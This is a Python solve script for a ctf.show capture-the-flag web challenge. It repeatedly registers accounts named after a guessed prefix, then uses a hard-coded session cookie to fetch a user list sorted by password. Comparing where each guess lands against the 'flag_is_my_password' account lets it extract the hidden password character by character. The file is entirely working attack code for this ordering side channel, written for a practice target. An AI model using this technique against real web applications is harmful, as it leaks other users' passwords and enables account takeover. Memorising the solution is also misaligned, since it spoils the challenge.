import requests
import hashlib


def md5P(p):
    m = hashlib.md5(p.encode('utf-8')).hexdigest()
    return m


key = "-.0123456789:abcdefghijklmnopqrstuvwxyz{|}~"

password = "ctfshow{"

for x in range(0, 100):
    for i in range(len(key)):
        psw = password + key[i]
        url = "http://794d9fe7-c7ec-4957-acd9-1fbb440d540b.challenge.ctf.show/reg.php"
        data = {
            "username": psw,
            "email": "cs",
            "nickname": "cs",
            "password": psw
        }
        s = requests.session().post(url, data=data)
        url2 = "http://794d9fe7-c7ec-4957-acd9-1fbb440d540b.challenge.ctf.show/user_main.php?order=3"
        s2 = requests.session().get(url2, headers={"Cookie": "PHPSESSID=1dcd433a8ff01e2dcfc8f8bce580ec0a	"})
        s2_text = s2.text
        if s2_text.index(psw) > s2_text.index("flag_is_my_password"):
            print("ok")
            password += key[i - 1]
            print(password)
            break
